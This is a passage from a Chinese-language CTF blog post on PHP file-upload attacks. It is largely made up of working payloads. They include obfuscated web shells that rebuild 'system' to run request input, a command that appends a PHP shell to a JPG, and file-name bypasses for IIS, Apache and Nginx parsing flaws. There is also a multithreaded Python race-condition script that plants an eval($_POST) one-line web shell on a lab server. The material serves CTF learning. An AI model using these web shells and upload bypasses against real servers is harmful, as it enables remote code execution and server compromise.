+<li><code>$a = &quot;s#y#s#t#e#m&quot;;</code></li>
+<li><code>$b = explode(&quot;#&quot;,$a);</code></li>
+<li><code>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</code></li>
+<li><code>$c($_REQUEST[1]);</code></li>
+<li><code>?&gt;</code></li>
+</ul>
+</li>
+<li>示例：<ul>
+<li><code>&lt;?php</code></li>
+<li><code>$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;</code></li>
+<li><code>$a($_REQUEST[1]);</code></li>
+<li><code>?&gt;</code></li>
+</ul>
+</li>
+<li>示例：<ul>
+<li><code>&lt;?php</code></li>
+<li><code>$a=strrev(&#39;metsys&#39;);</code></li>
+<li><code>$a($_REQUEST[1]);</code></li>
+<li><code>?&gt;</code></li>
+</ul>
+</li>
+<li>示例：<ul>
+<li><code>&lt;?php</code></li>
+<li><code>$a=$_REQUEST[&#39;a&#39;];</code></li>
+<li><code>$b=$_REQUEST[&#39;b&#39;];</code></li>
+<li><code>$a($b);</code></li>
+<li><code>?&gt;</code></li>
+</ul>
+</li>
+<li>图像检测函数<ul>
+<li><code>mime_content_type</code></li>
+<li><code>getimagesize和exif_imagetype函数</code><ul>
+<li>以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。</li>
+<li>示例：<ul>
+<li><code>打开 cmd，导航到包含 safe.jpg 和 shell.php 文件的目录，然后运行命令</code></li>
+<li><code>copy safe.jpg /b + shell.php /a shell.jpg</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="文件移动函数"><a href="#文件移动函数" class="headerlink" title="文件移动函数"></a>文件移动函数</h2><ul>
+<li>示例：<ul>
+<li><code>move_uploaded_file函数会忽略掉文件末尾的/.</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul>
+<li>示例：<ul>
+<li><code>IIS5.X/6.0</code><ul>
+<li><code>目录解析：如果目录采取/1.asp/的命令方式，那么访问该目录下的文件会默认以asp的方式执行</code></li>
+<li><code>文件解析：iis读取到;会默认结束，可以用1.asp;.jpg的形式进行绕过</code></li>
+<li><code>特殊后缀：1.asa、1.cer、1.cdx</code></li>
+</ul>
+</li>
+<li><code>IIS7/7.5</code><ul>
+<li>如果配置中开启 <code>cgi.fix_pathinf</code></li>
+<li>同 <code>nginx</code> 解析漏洞</li>
+</ul>
+</li>
+<li><code>Apache解析漏洞</code><ul>
+<li><code>解析漏洞:从右到左判断后缀并解析（低版本）</code></li>
+<li><code>123.php.asaa：Apache会先判断asaa不认识，那就会判断.php它认识就默认以这种方式进行解析。</code></li>
+</ul>
+</li>
+<li><code>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</code><ul>
+<li>示例：<ul>
+<li><code>shell.php%0a</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>Nginx解析漏洞</code><ul>
+<li>示例：<ul>
+<li><code>hack.jpg/1.php</code></li>
+<li><code>nginx看到文件扩展名是.php，便不管该文件是否存在，直接交给php处理，然后php的默认配置下看到右边的文件不存在，便删去最后的文件名，读取前一个，所以将.jpg处理成为php</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>nginx 文件名逻辑漏洞（CVE-2013-4547）</code><ul>
+<li>示例：<ul>
+<li><code>shell.gif[0x20][0x00].php</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>Windows环境</code><ul>
+<li>示例：<ul>
+<li><code>shell.php.jpg</code></li>
+<li><code>此时目录中会生成shell.php文件，但内容为空。再利用PHP和Windows环境的叠加属性：</code></li>
+<li><code>再上传shell.&gt;&gt;&gt;来匹配并覆盖shell.php</code></li>
+<li><code>shell.php::$DATA</code></li>
+<li><code>shell.php </code>（php后有个空格）</li>
+<li><code>shell.php.</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>shell.phtml</code></li>
+<li><code>shell.php%00</code></li>
+<li><code>shell.gif[0x20][0x00].php</code></li>
+<li><code>shell.php.jpg</code></li>
+<li><code>shell.pphphp</code></li>
+<li><code>shell.PHP</code></li>
+<li><code>shell.php.jpg</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><ul>
+<li>示例：<ul>
+<li><code>先移动，后检测，不符合再删除，符合则改名字</code></li>
+<li><code>使用多线程并发进行上传与访问操作</code></li>
+<li><code>查看源代码发现只能上传zip	那我们直接上传一句话就可以了	注意修改Content-Type为application/x-zip-compressed</code></li>
+<li><code>然后直接文件包含就可以了</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2><ul>
+<li>示例：<ul>
+<li><code>查看页面源代码，明显的条件竞争，新建一个文件shell.php，内容如下</code><ul>
+<li><code>&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#39;); ?&gt;</code></li>
+</ul>
+</li>
+<li>执行如下脚本进行竞争上传<ul>
+<li>示例：<ul>
+<li><code># -*- coding:utf-8 -*-</code></li>
+<li><code>import requests</code></li>
+<li><code>import threading</code></li>
+<li><code>import os</code></li>
+<li><code>class RaceCondition(threading.Thread):</code><ul>
+<li><code>def __init__(self):</code><ul>
+<li><code>threading.Thread.__init__(self)</code></li>
+<li><code>self.url = &#39;http://192.168.13.140:8011/uploads/shell.php&#39; #上传的文件地址</code></li>
+<li><code>self.uploadUrl = &#39;http://192.168.13.140:8011/index.php&#39; #上传文件的地址</code></li>
+</ul>
+</li>
+<li><code>def _get(self):</code><ul>
+<li><code>print(&#39;try to call uploaded file...&#39;)</code></li>
+<li><code>r = requests.get(self.url)</code></li>
+<li><code>if r.status_code == 200:</code><ul>
+<li><code>print(&#39;[*] create file info.php success.&#39;)</code></li>
+<li><code>os._exit(0)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>def _upload(self):</code><ul>
+<li><code>print(&#39;upload file...&#39;)</code></li>
+<li><code>file = &#123;&#39;myfile&#39;: open(&#39;shell.php&#39;, &#39;r&#39;)&#125; #本地脚本木马</code></li>
+<li><code>requests.post(self.uploadUrl, files=file)</code></li>
+</ul>
+</li>
+<li><code>def run(self):</code><ul>
+<li><code>while True:</code><ul>
+<li><code>for i in range(5):</code><ul>
+<li><code>self._get()</code></li>
+</ul>
+</li>
+<li><code>for i in range(10):</code><ul>
+<li><code>self._upload()</code></li>
+<li><code>self._get()</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>if __name__ == &#39;__main__&#39;:</code><ul>
+<li><code>threads = 50</code></li>
+<li><code>for i in range(threads):</code><ul>
+<li><code>t = RaceCondition()</code></li>
+<li><code>t.start()</code></li>
+</ul>
+</li>
+<li><code>for i in range(threads):</code><ul>
+<li><code>t.join()</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>成功后访问./uploads/info.php</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="phpinfo-页面"><a href="#phpinfo-页面" class="headerlink" title="phpinfo 页面"></a>phpinfo 页面</h1><ul>
+<li>PHP 版本信息<ul>
+<li>重要性: 通过了解PHP的具体版本，你可以查找该版本已知的漏洞。不同PHP版本可能存在不同的安全问题，例如远程代码执行、文件包含漏洞等。</li>
+<li>如何利用: 查找并利用该PHP版本的CVE（Common Vulnerabilities and Exposures）漏洞。例如，较旧版本的PHP可能存在未修复的远程代码执行漏洞。</li>
+<li>位置: <code>phpinfo()</code> 输出的顶部通常显示 <code>PHP Version</code> 字段。</li>
+</ul>
+</li>
+<li>加载的PHP模块<ul>
+<li>重要性: 加载的模块揭示了服务器支持的功能。例如，curl模块允许网络请求，gd模块提供图像处理功能。某些模块可能引入额外的攻击向量。</li>
+<li>如何利用: 通过加载的模块，可以识别出特定模块的漏洞并利用它们。例如，openssl模块的配置可能存在安全隐患。</li>
+<li>位置: <code>phpinfo()</code> 页面</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="文件上传的探测"><a href="#文件上传的探测" class="headerlink" title="文件上传的探测"></a>文件上传的探测</h1><ul>
+<li>功能: 使用一些在线或自建的测试脚本，探测是否允许文件上传。</li>
+<li>使用方法:<ul>
+<li>尝试上传不同类型的文件（如.php, .jpg）并观察服务器响应。</li>
+<li>使用Web应用测试工具（如OWASP ZAP）中的文件上传探测功能。</li>
+</ul>
+</li>
+<li>结果: 通过响应状态码或文件路径的返回，判断文件上传的成功与否及其可能的利用方式。</li>
+</ul>
+<hr>
+<h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><ul>
+<li>功能: Nikto是一款开源的Web服务器扫描器，用于检测Web服务器的漏洞和配置问题。</li>
+<li>使用方法:<ul>
+<li><code>nikto -h http://example.com</code></li>
+</ul>
+</li>
+<li>结果: 能够发现服务器暴露的敏感文件、配置文件和其他潜在漏洞，并显示PHP版本等信息。</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://theganlove.github.io/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/" data-id="cm0kwqysx000l64dka4qcga77" data-title="文件操作篇" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          反序列化
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/09/01/rce%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">rce总结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/">CTF-web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/rce/">rce</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF/">艺术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A9%E5%91%BD%E6%8B%82%E6%99%93/">革命拂晓</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" rel="tag">文字感悟</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" rel="tag">自己的艺术</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-php/" style="font-size: 20px;">web php</a> <a href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" style="font-size: 10px;">文字感悟</a> <a href="/tags/%E7%8E%AF%E5%A2%83/" style="font-size: 15px;">环境</a> <a href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" style="font-size: 10px;">自己的艺术</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/">隐写系列</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/ssrf/">ssrf</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/">jwt等认证went</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
